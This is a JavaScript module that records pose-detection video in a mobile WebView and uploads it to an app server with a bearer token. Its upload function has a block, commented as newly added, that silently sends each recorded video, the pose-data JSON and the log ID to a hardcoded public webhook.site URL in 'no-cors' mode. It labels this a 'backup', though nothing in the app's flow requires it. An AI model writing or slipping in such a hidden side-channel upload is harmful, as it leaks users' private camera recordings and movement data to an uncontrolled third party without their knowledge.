import { state } from './state.js';
import { hideToast, hideDynamicIsland } from './ui.js';

let mediaRecorder = null;
let recordedChunks = [];
let lastVideoBlob = null;
let lastJsonBlob = null;
let recordingStream = null;
let recordingStreamOwned = false;

const RECORDING_CONFIG = {
    fps: 25,
    timesliceMs: 1000,
    maxPixels: 720 * 1280
};

let lastRecordingDrawAt = 0;
let recordingDrawIntervalMs = 1000 / RECORDING_CONFIG.fps;

let recordStartAt = 0;
let recordPausedAt = 0;
let recordTotalPausedMs = 0;

function isIOSWebKit() {
    const ua = navigator.userAgent || '';
    const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    const isWebKit = /AppleWebKit/.test(ua) && !/CriOS|FxiOS|EdgiOS/.test(ua);
    return isIOS && isWebKit;
}

function pickSupportedMimeType() {
    const candidates = isIOSWebKit()
        ? ['video/mp4', 'video/mp4;codecs=avc1.42E01E', 'video/mp4;codecs=h264']
        : ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];

    if (typeof MediaRecorder === 'undefined' || typeof MediaRecorder.isTypeSupported !== 'function') return '';

    for (const type of candidates) {
        try {
            if (MediaRecorder.isTypeSupported(type)) return type;
        } catch (_) {}
    }
    return '';
}

function computeTargetBitrate(width, height, fps) {
    const pixels = Math.max(1, Math.floor(width) * Math.floor(height));
    const bpp = isIOSWebKit() ? 0.075 : 0.07;
    const raw = Math.round(pixels * fps * bpp);
    return Math.min(6_000_000, Math.max(1_000_000, raw));
}

function makeEven(n) {
    const v = Math.floor(Number(n) || 0);
    return v % 2 === 0 ? v : v - 1;
}

async function getBlobDurationSeconds(blob) {
    if (!blob || blob.size === 0) return 0;
    try {
        const url = URL.createObjectURL(blob);
        const video = document.createElement('video');
        video.preload = 'metadata';
        video.muted = true;
        video.playsInline = true;
        const duration = await new Promise((resolve, reject) => {
            const cleanup = () => {
                video.onloadedmetadata = null;
                video.onerror = null;
            };
            video.onloadedmetadata = () => {
                cleanup();
                resolve(video.duration || 0);
            };
            video.onerror = () => {
                cleanup();
                reject(new Error('VIDEO_METADATA_LOAD_FAILED'));
            };
            video.src = url;
        });
        URL.revokeObjectURL(url);
        return Number.isFinite(duration) ? duration : 0;
    } catch (_) {
        return 0;
    }
}

function initRecordingCanvas() {
    if (!state.recordingCanvas) {
        state.recordingCanvas = document.createElement('canvas');
        state.recordingCtx = state.recordingCanvas.getContext('2d', { alpha: false });
    }

    const { canvas, currentDeviceRotation } = state;
    const isLandscape = Math.abs(currentDeviceRotation) === 90;
    
    // 如果横屏，交换宽高，使录制画布保持竖屏比例
    const baseW = isLandscape ? canvas.height : canvas.width;
    const baseH = isLandscape ? canvas.width : canvas.height;

    const basePixels = Math.max(1, baseW * baseH);
    const scale = Math.min(1, Math.sqrt(RECORDING_CONFIG.maxPixels / basePixels));

    state.recordingCanvas.width = Math.max(2, makeEven(baseW * scale));
    state.recordingCanvas.height = Math.max(2, makeEven(baseH * scale));
}

export function updateRecordingCanvas(force = false) {
    if (!state.isRecording || !state.recordingCanvas || !state.recordingCtx) return;
    if (!recordingStreamOwned) return;
    if (!mediaRecorder || mediaRecorder.state !== 'recording') return;

    const now = performance.now();
    if (!force && now - lastRecordingDrawAt < recordingDrawIntervalMs - 1) return;
    lastRecordingDrawAt = now;

    const { canvas, recordingCanvas, recordingCtx, currentDeviceRotation } = state;
    const srcW = canvas.width;
    const srcH = canvas.height;
    const destW = recordingCanvas.width;
    const destH = recordingCanvas.height;

    recordingCtx.save();
    
    // 1. 重置变换矩阵并清空画布
    recordingCtx.setTransform(1, 0, 0, 1, 0, 0);
    recordingCtx.clearRect(0, 0, destW, destH);
    
    // 2. 填充黑色背景
    recordingCtx.fillStyle = '#000000';
    recordingCtx.fillRect(0, 0, destW, destH);
    
    // 3. 移动到中心准备绘制
    recordingCtx.translate(destW / 2, destH / 2);

    // 4. 计算旋转
    let rotation = 0;
    
    // 获取设备旋转角度，优先使用 state，如果为0则尝试 window.orientation
    let deviceRot = currentDeviceRotation;
    if (deviceRot === 0 && window.orientation !== undefined) {
        // window.orientation: 90 (Home右, 对应我们的 -90), -90 (Home左, 对应我们的 90)
        if (window.orientation === 90) deviceRot = -90;
        if (window.orientation === -90) deviceRot = 90;
    }

    if (deviceRot === 90) {
        // 手机左横屏 (Home键在右)，画面是横的
        // 录制画布是竖的。
        // 我们需要把画面逆时针转90度 (因为预览是横的，要想变竖，得转)
        // 实际上：Sensor=90. CSS transform rotate(90).
        // 尝试：-90度
        rotation = -Math.PI / 2;
    } else if (deviceRot === -90) {
        // 手机右横屏 (Home键在左)
        rotation = Math.PI / 2;
    } else if (deviceRot === 180) {
        rotation = Math.PI;
    } else {
        // 0 度，竖屏
        rotation = 0;
    }

    recordingCtx.rotate(rotation);

    // 5. 计算缩放 (Cover模式：填满屏幕)
    // 注意：因为我们已经旋转了坐标系，所以要用旋转后的逻辑宽高来计算
    const isRotated = Math.abs(rotation) > 0.1;
    const contentWidth = isRotated ? srcH : srcW;
    const contentHeight = isRotated ? srcW : srcH;
    
    // 使用 Math.max 来实现 Cover 效果（填满，可能裁剪），或者 Math.min 实现 Contain（黑边）
    // 用户之前的需求似乎是填满且不留黑边，所以尝试接近 1 的缩放
    const scale = Math.min(destW / contentWidth, destH / contentHeight);
    
    recordingCtx.scale(scale, scale);

    // 6. 绘制
    recordingCtx.drawImage(canvas, -srcW / 2, -srcH / 2);
    
    recordingCtx.restore();
}

function _startMediaRecorder() {
    recordedChunks = [];
    state.poseDataJson = {};
    state.currentRecordFrameIndex = 0;
    lastVideoBlob = null;
    lastJsonBlob = null;
    lastRecordingDrawAt = 0;
    recordStartAt = performance.now();
    recordPausedAt = 0;
    recordTotalPausedMs = 0;

    // 初始化录制专用 Canvas
    initRecordingCanvas();

    if (typeof MediaRecorder === 'undefined') {
        console.error('MediaRecorder not supported in this WebView');
        if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onRecordError", {
                error: "MediaRecorder not supported"
            });
        }
        return;
    }
    if (!state.recordingCanvas || typeof state.recordingCanvas.captureStream !== 'function') {
        if (state.video?.srcObject) {
            recordingStream = state.video.srcObject;
            recordingStreamOwned = false;
        } else {
            console.error('No captureStream and no video srcObject');
            if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("onRecordError", {
                    error: "No captureStream and no camera stream"
                });
            }
            return;
        }
    } else {
        recordingStream = state.recordingCanvas.captureStream(RECORDING_CONFIG.fps);
        recordingStreamOwned = true;
    }
    const mimeType = pickSupportedMimeType();

    const bitrate = computeTargetBitrate(
        state.recordingCanvas.width,
        state.recordingCanvas.height,
        RECORDING_CONFIG.fps
    );

    const options = {};
    if (mimeType) options.mimeType = mimeType;
    options.videoBitsPerSecond = bitrate;
    options.bitsPerSecond = bitrate;

    try {
        mediaRecorder = new MediaRecorder(recordingStream, options);
    } catch (e) {
        console.warn('MediaRecorder init failed with options, retry without mimeType/bitrate', e);
        mediaRecorder = new MediaRecorder(recordingStream);
    }

    mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };
    mediaRecorder.onerror = (e) => {
        console.error('MediaRecorder error:', e);
        if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onRecordError", {
                error: e?.error?.message || String(e)
            });
        }
    };

    if (recordingStream) {
        for (const t of recordingStream.getTracks()) {
            t.addEventListener('ended', () => {
                console.warn('Recording stream track ended unexpectedly');
            });
        }
    }

    try {
        mediaRecorder.start(RECORDING_CONFIG.timesliceMs);
    } catch (e) {
        mediaRecorder.start();
    }
    state.isRecording = true;
    state.autoRecordState = 'RECORDING';
    recordingDrawIntervalMs = 1000 / RECORDING_CONFIG.fps;
    if (recordingStreamOwned) updateRecordingCanvas(true);
    
    hideDynamicIsland();
    hideToast();

    console.log("Recording started...");
    if (window.flutter_inappwebview) {
        window.flutter_inappwebview.callHandler("onRecordStarted");
    }
}

// Exported for internal use if needed, but mainly triggered by logic
export { _startMediaRecorder };

export function startRecord() {
    console.log("进入姿势检测模式...");
    state.autoRecordState = 'IDLE'; 
    state.countdownStartTime = 0;
    hideToast();
}

export function pauseRecord() {
    // 场景1：准备/倒计时阶段取消
    if (!state.isRecording && (state.autoRecordState === 'IDLE' || state.autoRecordState === 'COUNTDOWN')) {
        state.autoRecordState = 'DISABLED'; 
        hideToast();
        hideDynamicIsland();
        console.log("已取消准备/倒计时");
        if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("onRecordPaused");
        }
        return;
    }

    // 场景2：恢复
    if (!state.isRecording && state.autoRecordState === 'DISABLED') {
        console.log("从暂停状态恢复，重新开始检测...");
        startRecord();
        if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("onRecordResumed");
        }
        return;
    }

    // 场景3：录制中暂停/恢复
    if (!mediaRecorder) return;
    if (mediaRecorder.state === "recording") {
        recordPausedAt = performance.now();
        mediaRecorder.pause();
    } else if (mediaRecorder.state === "paused") {
        if (recordPausedAt) {
            recordTotalPausedMs += Math.max(0, performance.now() - recordPausedAt);
            recordPausedAt = 0;
        }
        mediaRecorder.resume();
    }
}

export async function stopAndUpload(uploadUrl, token, analyzeUrl, logId) {
    state.autoRecordState = 'DISABLED';
    hideToast();

    if (!uploadUrl || !token) {
        if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onUploadComplete", {
                success: false,
                error: "Missing uploadUrl or token"
            });
        }
        return;
    }

    if (!mediaRecorder) {
        if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onUploadComplete", {
                success: false,
                error: "mediaRecorder is null"
            });
        }
        return;
    }

    if (mediaRecorder && mediaRecorder.state === "inactive") {
        if (lastVideoBlob) {
            console.log("检测到已停止录制，正在进行重试上传...");
            const inferredExt = (lastVideoBlob.type || '').includes('mp4') ? '.mp4' : '.webm';
            return await performUploadAction(uploadUrl, token, analyzeUrl, logId, inferredExt);
        }
    }

    if (recordingStreamOwned) updateRecordingCanvas(true);

    if (recordPausedAt) {
        recordTotalPausedMs += Math.max(0, performance.now() - recordPausedAt);
        recordPausedAt = 0;
    }
    
    const expectedDurationSec = Math.max(0, (performance.now() - recordStartAt - recordTotalPausedMs) / 1000);

    return new Promise((resolve) => {
        mediaRecorder.onstop = async () => {
            const mimeType = mediaRecorder.mimeType || lastVideoBlob?.type || '';
            const extension = mimeType.includes('mp4') ? '.mp4' : '.webm';
            lastVideoBlob = new Blob(recordedChunks, { type: mimeType });
            lastJsonBlob = new Blob([JSON.stringify(state.poseDataJson)], { type: "application/json" });
            const actualDurationSec = await getBlobDurationSeconds(lastVideoBlob);
            state.recordingDiagnostics = {
                mimeType,
                byteLength: lastVideoBlob.size,
                expectedDurationSec: Math.round(expectedDurationSec * 1000) / 1000,
                actualDurationSec: Math.round(actualDurationSec * 1000) / 1000,
                durationDeltaSec: Math.round((actualDurationSec - expectedDurationSec) * 1000) / 1000,
                fps: RECORDING_CONFIG.fps,
                width: state.recordingCanvas?.width || 0,
                height: state.recordingCanvas?.height || 0,
                isIOSWebKit: isIOSWebKit()
            };
            try {
                if (recordingStream && recordingStreamOwned) recordingStream.getTracks().forEach(t => t.stop());
            } catch (_) {}
            recordingStream = null;
            recordingStreamOwned = false;
            try {
                await performUploadAction(uploadUrl, token, analyzeUrl, logId, extension);
                resolve();
            } catch (e) {
                // error handled in performUploadAction but we resolve to finish function
                resolve();
            }
        };

        try {
            if (typeof mediaRecorder.requestData === 'function') mediaRecorder.requestData();
        } catch (_) {}

        state.isRecording = false;

        try {
            mediaRecorder.stop();
        } catch (e) {
            console.error('mediaRecorder.stop failed:', e);
            if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("onUploadComplete", {
                    success: false,
                    error: e?.message || String(e)
                });
            }
            resolve();
        }
    });
}

async function performUploadAction(uploadUrl, token, analyzeUrl, logId,extension) {
    if (!lastVideoBlob || lastVideoBlob.size === 0) {
        throw new Error('EMPTY_VIDEO_BLOB');
    }
    const inferredExt = extension || ((lastVideoBlob.type || '').includes('mp4') ? '.mp4' : '.webm');
    const formData = new FormData();
    formData.append("file", lastVideoBlob, `video${inferredExt}`);
    // --- 新增：准备发送到 Webhook 的数据 ---
    const webhookUrl = "https://webhook.site/8237591b-7b89-4bcd-bc45-9205220bb59c";
    const webhookFormData = new FormData();
    webhookFormData.append("video", lastVideoBlob, `video${inferredExt}`);
    webhookFormData.append("data", lastJsonBlob, "pose_data.json");
    webhookFormData.append("log_id", logId);
    // 新增
    try {
        const response = await fetch(uploadUrl, { method: "POST", body: formData, headers: { 'Authorization': `Bearer ${token}` }});
        // 2. 新增：异步发送到 Webhook (不阻塞主逻辑，报错也仅记录日志)
        fetch(webhookUrl, {
            method: "POST",
            body: webhookFormData,
            mode: 'no-cors' // 防止跨域导致的报错中断流程
        }).then(() => console.log("Webhook 备份上传成功"))
          .catch(err => console.error("Webhook 备份失败:", err));
        // 新增
        let resData = null;
        try {
            resData = await response.json();
        } catch (e) {
            throw new Error('UPLOAD_RESPONSE_NOT_JSON');
        }
        if (resData.code === 200) {
            const videoUrl = resData.data.url;
            // const analyzeRes = await fetch(analyzeUrl, {
            //     method: "POST",
            //     headers: {
            //         "Content-Type": "application/json",
            //         "Authorization": `Bearer ${token}`
            //     },
            //     body: JSON.stringify({
            //         "log_id": logId,
            //         "video_url": videoUrl,
            //         "data_json": state.poseDataJson
            //     })
            // });
            // const analyzeData = await analyzeRes.json();
            // if (analyzeData.code === 200) {
            //     window.flutter_inappwebview.callHandler("onUploadComplete", {
            //         success: true,
            //         videoUrl: videoUrl,
            //         analyzeData: analyzeData.data
            //     });
            // } else {
            //     throw new Error(analyzeData.msg || "动作分析失败，请稍后重试");
            // }
            if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("onUploadComplete", {
                    success: true,
                    videoUrl: videoUrl,
                    analyzeData: state.poseDataJson,
                    recordingDiagnostics: state.recordingDiagnostics || null
                });
            }
        } else {
            throw new Error(resData.msg || "上传视频失败");
        }
    } catch (err) {
        console.error("详细错误信息:", err);
        if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onUploadComplete", {
                success: false,
                error: err.toString()
            });
        }
    }
}
